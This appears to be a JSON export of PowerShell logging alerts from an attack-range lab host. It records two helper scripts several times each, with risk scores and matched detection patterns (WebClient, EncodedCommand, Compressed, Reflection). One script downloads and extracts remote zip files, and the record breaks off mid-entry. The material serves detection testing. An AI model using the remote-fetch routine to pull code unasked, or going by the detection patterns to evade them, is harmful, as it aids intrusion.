[
    {
      "timestamp": null,
      "event_id": null,
      "risk_score": null,
      "detected_patterns": null,
      "pattern_details": null,
      "command_length": null,
      "full_command": null,
      "computer": null,
      "user_sid": "Unknown",
      "message_number": null,
      "message_total": null,
      "matched_patterns": null
    },
    {
      "timestamp": null,
      "event_id": null,
      "risk_score": null,
      "detected_patterns": null,
      "pattern_details": null,
      "command_length": null,
      "full_command": null,
      "computer": null,
      "user_sid": "Unknown",
      "message_number": null,
      "message_total": null,
      "matched_patterns": null
    },
    {
      "timestamp": null,
      "event_id": null,
      "risk_score": null,
      "detected_patterns": null,
      "pattern_details": null,
      "command_length": null,
      "full_command": null,
      "computer": null,
      "user_sid": "Unknown",
      "message_number": null,
      "message_total": null,
      "matched_patterns": null
    },
    {
      "timestamp": "2024-12-16T20:34:55.2179976+00:00",
      "event_id": 35710695,
      "risk_score": 12,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection, Compressed",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]",
      "command_length": 1791,
      "full_command": "function Invoke-FetchFromZip {\n    Param(\n        [Parameter(Mandatory = $true, Position = 0)]\n        [String]\n        $zipUrl,\n        [Parameter(Mandatory = $true, Position = 1)]\n        [String]\n        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip\n        [Parameter(Mandatory = $true, Position = 2)]\n        [String]\n        $destinationPath\n    )\n\n    # load ZIP methods\n    Add-Type -AssemblyName System.IO.Compression.FileSystem\n    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null\n\n    # read zip archive into memory\n    $ms = New-Object IO.MemoryStream\n    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)\n    $Zip = New-Object System.IO.Compression.ZipArchive($ms)\n\n    # ensure the output folder exists\n    $parent = split-path $destinationPath\n    $exists = Test-Path -Path $parent\n    if ($exists -eq $false) {\n        $null = New-Item -Path $destinationPath -ItemType Directory -Force\n    }\n\n    # find all files in ZIP that match the filter (i.e. file extension)\n    $zip.Entries |\n    Where-Object {\n            ($_.FullName -like $targetFilter)\n    } |\n    ForEach-Object {\n        # extract the selected items from the ZIP archive\n        # and copy them to the out folder\n        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)\n        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null\n        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)\n    }\n    $zip.Dispose()\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4219209+00:00",
      "event_id": 35710556,
      "risk_score": 12,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection, Compressed",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]",
      "command_length": 1791,
      "full_command": "function Invoke-FetchFromZip {\n    Param(\n        [Parameter(Mandatory = $true, Position = 0)]\n        [String]\n        $zipUrl,\n        [Parameter(Mandatory = $true, Position = 1)]\n        [String]\n        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip\n        [Parameter(Mandatory = $true, Position = 2)]\n        [String]\n        $destinationPath\n    )\n\n    # load ZIP methods\n    Add-Type -AssemblyName System.IO.Compression.FileSystem\n    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null\n\n    # read zip archive into memory\n    $ms = New-Object IO.MemoryStream\n    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)\n    $Zip = New-Object System.IO.Compression.ZipArchive($ms)\n\n    # ensure the output folder exists\n    $parent = split-path $destinationPath\n    $exists = Test-Path -Path $parent\n    if ($exists -eq $false) {\n        $null = New-Item -Path $destinationPath -ItemType Directory -Force\n    }\n\n    # find all files in ZIP that match the filter (i.e. file extension)\n    $zip.Entries |\n    Where-Object {\n            ($_.FullName -like $targetFilter)\n    } |\n    ForEach-Object {\n        # extract the selected items from the ZIP archive\n        # and copy them to the out folder\n        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)\n        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null\n        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)\n    }\n    $zip.Dispose()\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.0954819+00:00",
      "event_id": 35710886,
      "risk_score": 12,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection, Compressed",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]",
      "command_length": 1791,
      "full_command": "function Invoke-FetchFromZip {\n    Param(\n        [Parameter(Mandatory = $true, Position = 0)]\n        [String]\n        $zipUrl,\n        [Parameter(Mandatory = $true, Position = 1)]\n        [String]\n        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip\n        [Parameter(Mandatory = $true, Position = 2)]\n        [String]\n        $destinationPath\n    )\n\n    # load ZIP methods\n    Add-Type -AssemblyName System.IO.Compression.FileSystem\n    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null\n\n    # read zip archive into memory\n    $ms = New-Object IO.MemoryStream\n    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)\n    $Zip = New-Object System.IO.Compression.ZipArchive($ms)\n\n    # ensure the output folder exists\n    $parent = split-path $destinationPath\n    $exists = Test-Path -Path $parent\n    if ($exists -eq $false) {\n        $null = New-Item -Path $destinationPath -ItemType Directory -Force\n    }\n\n    # find all files in ZIP that match the filter (i.e. file extension)\n    $zip.Entries |\n    Where-Object {\n            ($_.FullName -like $targetFilter)\n    } |\n    ForEach-Object {\n        # extract the selected items from the ZIP archive\n        # and copy them to the out folder\n        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)\n        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null\n        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)\n    }\n    $zip.Dispose()\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.227533+00:00",
      "event_id": 35711074,
      "risk_score": 12,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection, Compressed",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]",
      "command_length": 1791,
      "full_command": "function Invoke-FetchFromZip {\n    Param(\n        [Parameter(Mandatory = $true, Position = 0)]\n        [String]\n        $zipUrl,\n        [Parameter(Mandatory = $true, Position = 1)]\n        [String]\n        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip\n        [Parameter(Mandatory = $true, Position = 2)]\n        [String]\n        $destinationPath\n    )\n\n    # load ZIP methods\n    Add-Type -AssemblyName System.IO.Compression.FileSystem\n    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null\n\n    # read zip archive into memory\n    $ms = New-Object IO.MemoryStream\n    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)\n    $Zip = New-Object System.IO.Compression.ZipArchive($ms)\n\n    # ensure the output folder exists\n    $parent = split-path $destinationPath\n    $exists = Test-Path -Path $parent\n    if ($exists -eq $false) {\n        $null = New-Item -Path $destinationPath -ItemType Directory -Force\n    }\n\n    # find all files in ZIP that match the filter (i.e. file extension)\n    $zip.Entries |\n    Where-Object {\n            ($_.FullName -like $targetFilter)\n    } |\n    ForEach-Object {\n        # extract the selected items from the ZIP archive\n        # and copy them to the out folder\n        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)\n        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null\n        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)\n    }\n    $zip.Dispose()\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'\nPattern 'Compressed' matched: 'IO.Compression'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4734477+00:00",
      "event_id": 35710591,
      "risk_score": 10,
      "detected_patterns": ", EncodedCommand, WebClient, SuspiciousKeyword",
      "pattern_details": "EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]",
      "command_length": 7821,
      "full_command": "# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1\nfunction Invoke-Process {\n    [OutputType([PSCustomObject])]\n    [CmdletBinding()]\n    param\n    (\n        [Parameter(Mandatory = $false, Position = 0)]\n        [string]$FileName = \"PowerShell.exe\",\n\n        [Parameter(Mandatory = $false, Position = 1)]\n        [string[]]$Arguments = \"\",\n\n        [Parameter(Mandatory = $false, Position = 3)]\n        [Int]$TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, Position = 4)]\n        [String]$stdoutFile = $null,\n\n        [Parameter(Mandatory = $false, Position = 5)]\n        [String]$stderrFile = $null\n    )\n\n    end {\n        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n        try {\n            # new Process\n            if ($stdoutFile) {\n                # new Process\n                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory\n\n                # Event Handler for Output\n                $stdSb = New-Object -TypeName System.Text.StringBuilder\n                $errorSb = New-Object -TypeName System.Text.StringBuilder\n                $scripBlock =\n                {\n                    $x = $Event.SourceEventArgs.Data\n                    if (-not [String]::IsNullOrEmpty($x)) {\n                        $Event.MessageData.AppendLine($x)\n                    }\n                }\n                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb\n                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb\n\n                # execution\n                $process.Start() > $null\n                $process.BeginOutputReadLine()\n                $process.BeginErrorReadLine()\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                $isTimeout = $false\n                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    $isTimeout = $true\n                    Invoke-KillProcessTree $process.id\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                }\n                $process.CancelOutputRead()\n                $process.CancelErrorRead()\n\n                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())\n                Unregister-Event -SourceIdentifier $stdEvent.Name\n                Unregister-Event -SourceIdentifier $errorEvent.Name\n\n                $stdOutString = $stdSb.ToString().Trim()\n                if ($stdOutString.Length -gt 0) {\n                    Write-Host $stdOutString\n                }\n\n                $stdErrString = $errorSb.ToString().Trim()\n                if ($stdErrString.Length -gt 0) {\n                    Write-Host $stdErrString\n                }\n\n                # Get Process result\n                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout\n            }\n            else {\n                # This is the enitrety of the \"old style\" code, kept for interactive tests\n                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru\n                # cache process.Handle, otherwise ExitCode is null from powershell processes\n                $handle = $process.Handle\n\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    Invoke-KillProcessTree $process.id\n\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                    if ($stdoutFile) {\n                        # Add a warning in stdoutFile in case of timeout\n                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately\n                        # solution: retry at most 10 times with 100ms between each attempt\n                        For ($i = 0; $i -lt 10; $i++) {\n                            try {\n                                \"<timeout>\" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII\n                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop\n                            }\n                            catch {} # file is locked\n                            Start-Sleep -m 100\n                        }\n                    }\n                }\n\n                if ($IsLinux -or $IsMacOS) {\n                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results\n                }\n\n                # Get Process result\n                return [PSCustomObject]@{\n                    StandardOutput = \"\"\n                    ErrorOutput    = \"\"\n                    ExitCode       = $process.ExitCode\n                    ProcessId      = $Process.Id\n                    IsTimeOut      = $IsTimeout\n                }\n\n            }\n\n        }\n        finally {\n            if ($null -ne $process) { $process.Dispose() }\n            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }\n            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }\n        }\n    }\n\n    begin {\n        function NewProcess {\n            [OutputType([System.Diagnostics.Process])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                [string]$FileName,\n\n                [parameter(Mandatory = $false)]\n                [string[]]$Arguments,\n\n                [parameter(Mandatory = $false)]\n                [string]$WorkingDirectory\n            )\n\n            # ProcessStartInfo\n            $psi = New-object System.Diagnostics.ProcessStartInfo\n            $psi.CreateNoWindow = $true\n            $psi.UseShellExecute = $false\n            $psi.RedirectStandardOutput = $true\n            $psi.RedirectStandardError = $true\n            $psi.FileName = $FileName\n            $psi.Arguments += $Arguments\n            $psi.WorkingDirectory = $WorkingDirectory\n\n            # Set Process\n            $process = New-Object System.Diagnostics.Process\n            $process.StartInfo = $psi\n            $process.EnableRaisingEvents = $true\n            return $process\n        }\n\n        function GetCommandResult {\n            [OutputType([PSCustomObject])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                [System.Diagnostics.Process]$Process,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$StandardStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$ErrorStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [Bool]$IsTimeout\n            )\n\n            return [PSCustomObject]@{\n                StandardOutput = $StandardStringBuilder.ToString().Trim()\n                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()\n                ExitCode       = $Process.ExitCode\n                ProcessId      = $Process.Id\n                IsTimeOut      = $IsTimeout\n            }\n        }\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2704298+00:00",
      "event_id": 35710730,
      "risk_score": 10,
      "detected_patterns": ", EncodedCommand, WebClient, SuspiciousKeyword",
      "pattern_details": "EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]",
      "command_length": 7821,
      "full_command": "# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1\nfunction Invoke-Process {\n    [OutputType([PSCustomObject])]\n    [CmdletBinding()]\n    param\n    (\n        [Parameter(Mandatory = $false, Position = 0)]\n        [string]$FileName = \"PowerShell.exe\",\n\n        [Parameter(Mandatory = $false, Position = 1)]\n        [string[]]$Arguments = \"\",\n\n        [Parameter(Mandatory = $false, Position = 3)]\n        [Int]$TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, Position = 4)]\n        [String]$stdoutFile = $null,\n\n        [Parameter(Mandatory = $false, Position = 5)]\n        [String]$stderrFile = $null\n    )\n\n    end {\n        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n        try {\n            # new Process\n            if ($stdoutFile) {\n                # new Process\n                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory\n\n                # Event Handler for Output\n                $stdSb = New-Object -TypeName System.Text.StringBuilder\n                $errorSb = New-Object -TypeName System.Text.StringBuilder\n                $scripBlock =\n                {\n                    $x = $Event.SourceEventArgs.Data\n                    if (-not [String]::IsNullOrEmpty($x)) {\n                        $Event.MessageData.AppendLine($x)\n                    }\n                }\n                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb\n                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb\n\n                # execution\n                $process.Start() > $null\n                $process.BeginOutputReadLine()\n                $process.BeginErrorReadLine()\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                $isTimeout = $false\n                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    $isTimeout = $true\n                    Invoke-KillProcessTree $process.id\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                }\n                $process.CancelOutputRead()\n                $process.CancelErrorRead()\n\n                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())\n                Unregister-Event -SourceIdentifier $stdEvent.Name\n                Unregister-Event -SourceIdentifier $errorEvent.Name\n\n                $stdOutString = $stdSb.ToString().Trim()\n                if ($stdOutString.Length -gt 0) {\n                    Write-Host $stdOutString\n                }\n\n                $stdErrString = $errorSb.ToString().Trim()\n                if ($stdErrString.Length -gt 0) {\n                    Write-Host $stdErrString\n                }\n\n                # Get Process result\n                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout\n            }\n            else {\n                # This is the enitrety of the \"old style\" code, kept for interactive tests\n                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru\n                # cache process.Handle, otherwise ExitCode is null from powershell processes\n                $handle = $process.Handle\n\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    Invoke-KillProcessTree $process.id\n\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                    if ($stdoutFile) {\n                        # Add a warning in stdoutFile in case of timeout\n                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately\n                        # solution: retry at most 10 times with 100ms between each attempt\n                        For ($i = 0; $i -lt 10; $i++) {\n                            try {\n                                \"<timeout>\" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII\n                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop\n                            }\n                            catch {} # file is locked\n                            Start-Sleep -m 100\n                        }\n                    }\n                }\n\n                if ($IsLinux -or $IsMacOS) {\n                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results\n                }\n\n                # Get Process result\n                return [PSCustomObject]@{\n                    StandardOutput = \"\"\n                    ErrorOutput    = \"\"\n                    ExitCode       = $process.ExitCode\n                    ProcessId      = $Process.Id\n                    IsTimeOut      = $IsTimeout\n                }\n\n            }\n\n        }\n        finally {\n            if ($null -ne $process) { $process.Dispose() }\n            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }\n            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }\n        }\n    }\n\n    begin {\n        function NewProcess {\n            [OutputType([System.Diagnostics.Process])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                [string]$FileName,\n\n                [parameter(Mandatory = $false)]\n                [string[]]$Arguments,\n\n                [parameter(Mandatory = $false)]\n                [string]$WorkingDirectory\n            )\n\n            # ProcessStartInfo\n            $psi = New-object System.Diagnostics.ProcessStartInfo\n            $psi.CreateNoWindow = $true\n            $psi.UseShellExecute = $false\n            $psi.RedirectStandardOutput = $true\n            $psi.RedirectStandardError = $true\n            $psi.FileName = $FileName\n            $psi.Arguments += $Arguments\n            $psi.WorkingDirectory = $WorkingDirectory\n\n            # Set Process\n            $process = New-Object System.Diagnostics.Process\n            $process.StartInfo = $psi\n            $process.EnableRaisingEvents = $true\n            return $process\n        }\n\n        function GetCommandResult {\n            [OutputType([PSCustomObject])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                [System.Diagnostics.Process]$Process,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$StandardStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [System.Text.StringBuilder]$ErrorStringBuilder,\n\n                [parameter(Mandatory = $true)]\n                [Bool]$IsTimeout\n            )\n\n            return [PSCustomObject]@{\n                StandardOutput = $StandardStringBuilder.ToString().Trim()\n                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()\n                ExitCode       = $Process.ExitCode\n                ProcessId      = $Process.Id\n                IsTimeOut      = $IsTimeout\n            }\n        }\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2766858+00:00",
      "event_id": 35711109,
      "risk_score": 10,
      "detected_patterns": ", EncodedCommand, WebClient, SuspiciousKeyword",
      "pattern_details": "EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]",
      "command_length": 7821,
      "full_command": "# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1\nfunction Invoke-Process {\n    [OutputType([PSCustomObject])]\n    [CmdletBinding()]\n    param\n    (\n        [Parameter(Mandatory = $false, Position = 0)]\n        [string]$FileName = \"PowerShell.exe\",\n\n        [Parameter(Mandatory = $false, Position = 1)]\n        [string[]]$Arguments = \"\",\n\n        [Parameter(Mandatory = $false, Position = 3)]\n        [Int]$TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, Position = 4)]\n        [String]$stdoutFile = $null,\n\n        [Parameter(Mandatory = $false, Position = 5)]\n        [String]$stderrFile = $null\n    )\n\n    end {\n        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n        try {\n            # new Process\n            if ($stdoutFile) {\n                # new Process\n                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory\n\n                # Event Handler for Output\n                $stdSb = New-Object -TypeName System.Text.StringBuilder\n                $errorSb = New-Object -TypeName System.Text.StringBuilder\n                $scripBlock =\n                {\n                    $x = $Event.SourceEventArgs.Data\n                    if (-not [String]::IsNullOrEmpty($x)) {\n                        $Event.MessageData.AppendLine($x)\n                    }\n                }\n                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb\n                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb\n\n                # execution\n                $process.Start() > $null\n                $process.BeginOutputReadLine()\n                $process.BeginErrorReadLine()\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                $isTimeout = $false\n                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    $isTimeout = $true\n                    Invoke-KillProcessTree $process.id\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                }\n                $process.CancelOutputRead()\n                $process.CancelErrorRead()\n\n                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())\n                Unregister-Event -SourceIdentifier $stdEvent.Name\n                Unregister-Event -SourceIdentifier $errorEvent.Name\n\n                $stdOutString = $stdSb.ToString().Trim()\n                if ($stdOutString.Length -gt 0) {\n                    Write-Host $stdOutString\n                }\n\n                $stdErrString = $errorSb.ToString().Trim()\n                if ($stdErrString.Length -gt 0) {\n                    Write-Host $stdErrString\n                }\n\n                # Get Process result\n                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout\n            }\n            else {\n                # This is the enitrety of the \"old style\" code, kept for interactive tests\n                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru\n                # cache process.Handle, otherwise ExitCode is null from powershell processes\n                $handle = $process.Handle\n\n                # wait for complete\n                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))\n                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {\n                    Invoke-KillProcessTree $process.id\n\n                    Write-Host -ForegroundColor Red \"Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout\"\n                    if ($stdoutFile) {\n                        # Add a warning in stdoutFile in case of timeout\n                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately\n                        # solution: retry at most 10 times with 100ms between each attempt\n                        For ($i = 0; $i -lt 10; $i++) {\n                            try {\n                                \"<timeout>\" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII\n                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop\n                            }\n                            catch {} # file is locked\n                            Start-Sleep -m 100\n                        }\n                    }\n                }\n\n                if ($IsLinux -or $IsMacOS) {\n                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results\n                }\n\n                # Get Process result\n                return [PSCustomObject]@{\n                    StandardOutput = \"\"\n                    ErrorOutput    = \"\"\n                    ExitCode       = $process.ExitCode\n                    ProcessId      = $Process.Id\n                    IsTimeOut      = $IsTimeout\n                }\n\n            }\n\n        }\n        finally {\n            if ($null -ne $process) { $process.Dispose() }\n            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }\n            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }\n        }\n    }\n\n    begin {\n        function NewProcess {\n            [OutputType([System.Diagnostics.Process])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                [string]$FileName,\n\n                [parameter(Mandatory = $false)]\n                [string[]]$Arguments,\n\n                [parameter(Mandatory = $false)]\n                [string]$WorkingDirectory\n            )\n\n            # ProcessStartInfo\n            $psi = New-object System.Diagnostics.ProcessStartInfo\n            $psi.CreateNoWindow = $true\n            $psi.UseShellExecute = $false\n            $psi.RedirectStandardOutput = $true\n            $psi.RedirectStandardError = $true\n            $psi.FileName = $FileName\n            $psi.Arguments += $Arguments\n            $psi.WorkingDirectory = $WorkingDirectory\n\n            # Set Process\n            $process = New-Object System.Diagnostics.Process\n            $process.StartInfo = $psi\n            $process.EnableRaisingEvents = $true\n            return $process\n        }\n\n        function GetCommandResult {\n            [OutputType([PSCustomObject])]\n            [CmdletBinding()]\n            param\n            (\n                [parameter(Mandatory = $true)]\n                